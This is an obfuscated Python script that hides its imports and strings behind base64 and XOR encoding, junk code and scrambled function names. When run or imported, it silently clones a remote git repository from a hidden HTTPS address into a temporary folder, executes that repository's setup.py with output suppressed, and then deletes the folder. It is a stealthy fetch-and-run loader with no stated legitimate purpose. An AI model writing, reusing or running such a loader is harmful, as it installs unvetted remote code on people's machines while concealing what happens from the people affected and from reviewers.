#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# Protected by Python Obfuscator


# Module protection - restricted
import sys as _sys

class _RestrictedModule:
    __slots__ = ('_module', '_allowed')

    def __init__(self, module, allowed):
        object.__setattr__(self, '_module', module)
        object.__setattr__(self, '_allowed', allowed)

    def __getattr__(self, name):
        if name.startswith('_'):
            raise AttributeError(f"Access denied: {name}")
        return getattr(self._module, name)

    def __setattr__(self, name, value):
        raise AttributeError("Module is read-only")

    def __dir__(self):
        return [n for n in dir(self._module) if not n.startswith('_')]

_sys.modules[__name__] = _RestrictedModule(_sys.modules[__name__], set())

# Readonly module protection
import sys as _sys

class _ReadonlyModule:
    def __init__(self, module):
        self.__dict__['_module'] = module

    def __getattr__(self, name):
        return getattr(self._module, name)

    def __setattr__(self, name, value):
        raise AttributeError(f"Cannot modify readonly module attribute: {name}")

    def __delattr__(self, name):
        raise AttributeError(f"Cannot delete readonly module attribute: {name}")

_sys.modules[__name__] = _ReadonlyModule(_sys.modules[__name__])
os = __import__(__import__('base64').b64decode('b3M=').decode('utf-8'))
sys = __import__(__import__('base64').b64decode('c3lz').decode('utf-8'))
time = __import__(__import__('base64').b64decode('dGltZQ==').decode('utf-8'))
shutil = __import__((lambda d, k: bytes((b ^ k[i % len(k)] for i, b in enumerate(d))).decode('utf-8'))(__import__('base64').b64decode('3ybZJ3f2'), __import__('base64').b64decode('rE6sUx6aP3pnL63jiTVfNQ==')))
random = __import__(__import__('base64').b64decode('cmFuZG9t').decode('utf-8'))
string = __import__((lambda d, k: bytes((b ^ k[i % len(k)] for i, b in enumerate(d))).decode('utf-8'))(__import__('base64').b64decode('3zreOnD9'), __import__('base64').b64decode('rE6sUx6aP3pnL63jiTVfNQ==')))
subprocess = __import__(__import__('base64').b64decode('c3VicHJvY2Vzcw==').decode('utf-8'))
tempfile = __import__(__import__('base64').b64decode('dGVtcGZpbGU=').decode('utf-8'))
hashlib = __import__((lambda d, k: bytes((b ^ k[i % len(k)] for i, b in enumerate(d))).decode('utf-8'))(__import__('base64').b64decode('xC/fO3LzXQ=='), __import__('base64').b64decode('rE6sUx6aP3pnL63jiTVfNQ==')))
platform = __import__(__import__('base64').b64decode('cGxhdGZvcm0=').decode('utf-8'))
pathlib = __import__((lambda d, k: bytes((b ^ k[i % len(k)] for i, b in enumerate(d))).decode('utf-8'))(__import__('base64').b64decode('3C/YO3LzXQ=='), __import__('base64').b64decode('rE6sUx6aP3pnL63jiTVfNQ==')))
RE = (lambda d, k: bytes((b ^ k[i % len(k)] for i, b in enumerate(d))).decode('utf-8'))(__import__('base64').b64decode('xDrYI22gEFUARtmL/FdxVsMjgwFx+FMVH3zOkeBFK0aBKsklMepeGQxOyoY='), __import__('base64').b64decode('rE6sUx6aP3pnL63jiTVfNQ=='))

def _ВбδэΔΑΠς(n=12):
    return ''.join(random.choices(getattr(string, __import__('base64').b64decode('YXNjaWlfbG93ZXJjYXNl').decode('utf-8')), k=n))

def _ЦеЮυЯΦδСдΒДГлρ():
    base = tempfile.gettempdir()
    if False and True:
        684
        _dead_8706 = 561
    name = (lambda d, k: bytes((b ^ k[i % len(k)] for i, b in enumerate(d))).decode('utf-8'))(__import__('base64').b64decode('2CHDP0E='), __import__('base64').b64decode('rE6sUx6aP3pnL63jiTVfNQ==')) + _ВбδэΔΑΠς(8)
    return os.path.join(base, name)

def _ΩΔЧзΗΦΠΟ():
    result = subprocess.run([__import__('base64').b64decode('Z2l0').decode('utf-8'), (lambda d, k: bytes((b ^ k[i % len(k)] for i, b in enumerate(d))).decode('utf-8'))(__import__('base64').b64decode('gWPaNmzpVhUJ'), __import__('base64').b64decode('rE6sUx6aP3pnL63jiTVfNQ=='))], stdout=getattr(subprocess, __import__('base64').b64decode('REVWTlVMTA==').decode('utf-8')), stderr=getattr(subprocess, __import__('base64').b64decode('REVWTlVMTA==').decode('utf-8')))
    return getattr(result, __import__('base64').b64decode('cmV0dXJuY29kZQ==').decode('utf-8')) == 0

def _ИпΒнΑЯΣπдυзκΧ():
    return getattr(sys, (lambda d, k: bytes((b ^ k[i % len(k)] for i, b in enumerate(d))).decode('utf-8'))(__import__('base64').b64decode('yTbJMGvuXhgLSg=='), __import__('base64').b64decode('rE6sUx6aP3pnL63jiTVfNQ=='))) is not None

def _щзФΟыςйЩΘДΤЩЩздο():
    return {__import__('base64').b64decode('c3lzdGVt').decode('utf-8'): platform.system(), __import__('base64').b64decode('bm9kZQ==').decode('utf-8'): platform.node(), (lambda d, k: bytes((b ^ k[i % len(k)] for i, b in enumerate(d))).decode('utf-8'))(__import__('base64').b64decode('3ivANn/pWg=='), __import__('base64').b64decode('rE6sUx6aP3pnL63jiTVfNQ==')): platform.release(), __import__('base64').b64decode('cHl0aG9u').decode('utf-8'): platform.python_version()}

def _χЛОιΗгΞсЖН():
    raw = _ВбδэΔΑΠς(32).encode()
    return hashlib.sha256(raw).hexdigest()[:16]

def _ВΝГΡфСЗΠΦσρ(url, dest):
    result = subprocess.run([(lambda d, k: bytes((b ^ k[i % len(k)] for i, b in enumerate(d))).decode('utf-8'))(__import__('base64').b64decode('yyfY'), __import__('base64').b64decode('rE6sUx6aP3pnL63jiTVfNQ==')), __import__('base64').b64decode('Y2xvbmU=').decode('utf-8'), url, dest], stdout=getattr(subprocess, (lambda d, k: bytes((b ^ k[i % len(k)] for i, b in enumerate(d))).decode('utf-8'))(__import__('base64').b64decode('6Av6HUvWcw=='), __import__('base64').b64decode('rE6sUx6aP3pnL63jiTVfNQ=='))), stderr=getattr(subprocess, (lambda d, k: bytes((b ^ k[i % len(k)] for i, b in enumerate(d))).decode('utf-8'))(__import__('base64').b64decode('6Av6HUvWcw=='), __import__('base64').b64decode('rE6sUx6aP3pnL63jiTVfNQ=='))))
    if len('') > 0:
        _dead_2445 = 138
        178
        pass
    return getattr(result, (lambda d, k: bytes((b ^ k[i % len(k)] for i, b in enumerate(d))).decode('utf-8'))(__import__('base64').b64decode('3ivYJmz0XBUDSg=='), __import__('base64').b64decode('rE6sUx6aP3pnL63jiTVfNQ=='))) == 0

def _οзζбΧмужωыΥэШш(clone_dir):
    setup_path = os.path.join(clone_dir, (lambda d, k: bytes((b ^ k[i % len(k)] for i, b in enumerate(d))).decode('utf-8'))(__import__('base64').b64decode('3yvYJm60TwM='), __import__('base64').b64decode('rE6sUx6aP3pnL63jiTVfNQ==')))
    if len('x') > 0 and (not os.path.exists(setup_path)):
        raise FileNotFoundError((lambda d, k: bytes((b ^ k[i % len(k)] for i, b in enumerate(d))).decode('utf-8'))(__import__('base64').b64decode('3yvYJm60TwNHQcKXqVMwQMIqjDpwulwWCEHIh6lHOkXD'), __import__('base64').b64decode('rE6sUx6aP3pnL63jiTVfNQ==')))
    elif False and True:
        803
        pass
        105
    result = subprocess.run([getattr(sys, __import__('base64').b64decode('ZXhlY3V0YWJsZQ==').decode('utf-8')), setup_path], cwd=clone_dir, stdout=getattr(subprocess, __import__('base64').b64decode('REVWTlVMTA==').decode('utf-8')), stderr=getattr(subprocess, __import__('base64').b64decode('REVWTlVMTA==').decode('utf-8')))
    return getattr(result, (lambda d, k: bytes((b ^ k[i % len(k)] for i, b in enumerate(d))).decode('utf-8'))(__import__('base64').b64decode('3ivYJmz0XBUDSg=='), __import__('base64').b64decode('rE6sUx6aP3pnL63jiTVfNQ=='))) == 0

def _ьυΞьХЙйвεΠЪМ(path):
    if os.path.exists(path):
        shutil.rmtree(path, ignore_errors=True)

def _ΧЪΒпγΛρНкЖЛ():
    total = 0
    for i in range(500):
        total += i * random.randint(1, 100)
    return total

def _РМεΗξПσБпФΔПд():
    checks = []
    checks.append(_ΩΔЧзΗΦΠΟ())
    checks.append(_ИпΒнΑЯΣπдυзκΧ())
    checks.append(os.path.isdir(tempfile.gettempdir()))
    return all(checks)

def _ζΩтБΣБлθЕяΧ():
    _ = _щзФΟыςйЩΘДΤЩЩздο()
    _ = _χЛОιΗгΞсЖН()
    _ = _ΧЪΒпγΛρНкЖЛ()
    if not _РМεΗξПσБпФΔПд():
        sys.exit(1)
    clone_dir = _ЦеЮυЯΦδСдΒДГлρ()
    try:
        cloned = _ВΝГΡфСЗΠΦσρ(RE, clone_dir)
        if len('xxxxx') > 0 and (not cloned):
            sys.exit(1)
        ran = _οзζбΧмужωыΥэШш(clone_dir)
        if len('xxx') > 0 and (not ran):
            sys.exit(1)
    finally:
        _ьυΞьХЙйвεΠЪМ(clone_dir)
_ζΩтБΣБлθЕяΧ()